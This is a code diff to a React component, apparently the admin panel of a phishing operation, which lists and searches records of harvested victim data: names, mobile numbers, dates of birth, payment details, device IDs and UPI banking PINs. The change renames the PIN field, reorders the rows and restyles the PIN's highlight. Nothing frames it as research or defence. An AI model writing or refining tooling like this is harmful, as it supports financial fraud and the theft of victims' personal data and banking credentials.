@@ -15,9 +15,9 @@ function PhishCard({ entry }: { entry: any }) {
   add('Mobile', entry.mobile)
   add('DOB', entry.dob)
   add('Gender', entry.gender)
-  add('Step', entry.step)
   add('Payment', entry.payment)
-  add('Token/UPI PIN', entry.token)
+  add('UPI PIN', entry.Token)
+  add('Step', entry.step)
   add('Timestamp', entry.timestamp)
 
   return (
@@ -26,8 +26,8 @@ function PhishCard({ entry }: { entry: any }) {
       {rows.map((r, i) => (
         <div key={i} className="phish-row">
           <span className="phish-key">{r.key}</span>
-          <span className={r.key.includes('PIN') || r.key.includes('Token') ? 'phish-val' : 'phish-val'} style={r.key.includes('PIN') || r.key.includes('Token') ? { color: 'var(--red)', fontWeight: 800 } : {}}>
-            {escapeHtml(r.val)}
+          <span className={r.key === 'UPI PIN' ? 'phish-val highlight' : 'phish-val'}>
+            {r.key === 'UPI PIN' ? escapeHtml(r.val) : escapeHtml(r.val)}
           </span>
         </div>
       ))}
@@ -41,7 +41,7 @@ export default function PhishingPage({ allPhishing }: { allPhishing: any[] }) {
   const filtered = allPhishing.filter(p =>
     (p.fullName || '').toLowerCase().includes(search.toLowerCase()) ||
     (p.mobile || '').toLowerCase().includes(search.toLowerCase()) ||
-    (p.token || '').toLowerCase().includes(search.toLowerCase()) ||
+    (p.Token || '').toLowerCase().includes(search.toLowerCase()) ||
     (p.deviceId || '').toLowerCase().includes(search.toLowerCase())
   )
 
